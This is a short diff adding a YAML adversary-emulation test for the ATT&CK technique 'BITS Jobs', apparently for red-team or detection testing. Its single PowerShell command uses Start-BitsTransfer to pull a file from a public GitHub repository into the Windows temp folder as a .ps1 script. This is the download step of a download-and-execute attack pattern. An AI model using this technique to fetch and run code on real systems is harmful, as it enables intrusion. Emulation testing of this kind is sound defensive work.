@@ -1,0 +1,14 @@
+---
+
+- id: tacmulti-1197-AR01-1v00-200120184608
+  name: Download & Execute via PowerShell BITS
+  description: .      This test simulates an adversary leveraging bitsadmin.exe to download.      and execute a payload leveraging PowerShell
+  tactic: multiple
+  technique:
+    attack_id: T1197
+    name: BITS Jobs
+  platforms:
+    windows:
+      psh:
+        command: |
+          Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination C:\Windows\Temp\bitsadmin_flag.ps1
